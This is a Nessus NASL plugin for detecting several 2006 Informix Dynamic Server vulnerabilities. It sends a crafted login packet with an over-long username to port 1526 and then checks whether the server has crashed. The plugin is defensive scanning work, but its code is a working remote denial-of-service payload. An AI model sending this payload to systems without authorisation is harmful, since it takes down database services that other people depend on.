#
# (C) Tenable Network Security
#


if (description)
{
  script_id(22229);
  script_version("$Revision: 1.3 $");

  script_cve_id(
    "CVE-2006-3853", 
    "CVE-2006-3855", 
    "CVE-2006-3856", 
    "CVE-2006-3857", 
    "CVE-2006-3858", 
    "CVE-2006-3860", 
    "CVE-2006-3861", 
    "CVE-2006-3862"
  );
  script_bugtraq_id(19264);

  script_name(english:"Informix Dynamic Server Multiple Vulnerabilities");
  script_summary(english:"Tries to crash Informix Dynamic Server with a long username");
 
  desc = "
Synopsis :

The remote host contains an application that is affected by several
vulnerabilities. 

Description :

The version of Informix Dynamic Server installed on the remote host
contains multiple vulnerabilities that may allow attackers to execute
arbitrary code, gain elevated privileges, uncover sensitive
information, deny service to legitimate users, etc.  Some of these
issues can be exploited remotely without authentication. 

See also :

http://www-1.ibm.com/support/docview.wss?uid=swg21242921

Solution :

Upgrade to Informix 10.00.xC4 / 9.40.xD8 / 7.31.xD9 or later. 

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc);
 
  script_category(ACT_DENIAL);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("informix_detect.nasl");
  script_require_ports("Services/informix", 1526);

  exit(0);
}


include("byte_func.inc");
include("misc_func.inc");


port = get_kb_item("Services/informix");
if (!port) port = 1526;
if (!get_port_state(port)) exit(0);


soc = open_sock_tcp(port);
if (!soc) exit(0);


# Try to log in with a long username.
user = crap(0x410);
pass = SCRIPT_NAME;
db = "sysmaster";
dbpath = "ol_nessus";
zero = raw_string(0x00);

req = raw_string(
  "sq",                                # header
  crap(8),                             # length + constant (to be filled in later)
  "sqlexec ",                          # magic
  user, " -p", pass, " ",              # credentials
  "9.22.TC1   ",                       # client version
  "RDS#N000000 ",                      # RDS
  "-d", db, " ",                       # database
  "-fIEEEI ",                          # IEEE
  "DBPATH=//", dbpath, " ",            # dbpath
  "CLIENT_LOCALE=en_US.CP1252 ",       # client locale
  "DB_LOCALE=en_US.819 ",              # db locale
  ":",
  "AG0AAAA9b3IAAAAAAAAAAAA9c29jdGNwAAAAAAABAAABMQAAAAAAAAAAc3FsZXh",
  "lYwAAAAAAAAVzcWxpAAACAAAAAwAKb2xfbmVzc3VzAABrAAAAAAAAnmUAAAAAAA",
  "duZXNzdXMAAAduZXNzdXMAAC1DOlxQcm9ncmFtIEZpbGVzXE5lc3N1c1xpbmZvc",
  "m1peF9kZXRlY3QubmFzbAAAdAAIAAAE0gAAAAAAfwo="
);
req = insstr(req, base64(str:raw_string(mkword(strlen(req)-4), 0x01, 0x3d, zero, zero)), 2, 9);

send(socket:soc, data:req);
res = recv(socket:soc, length:4096, timeout:20);
close(soc);


# If we didn't get a response...
if (isnull(res))
{
  # Check for a bit to see if it's down.
  max_tries = 3;
  for (try=0; try<max_tries; try++)
  {
    sleep(5);
    soc = open_sock_tcp(port);
    if (soc) close(soc);
    else
    {
      security_hole(port);
      exit(0);
    }
  }
}
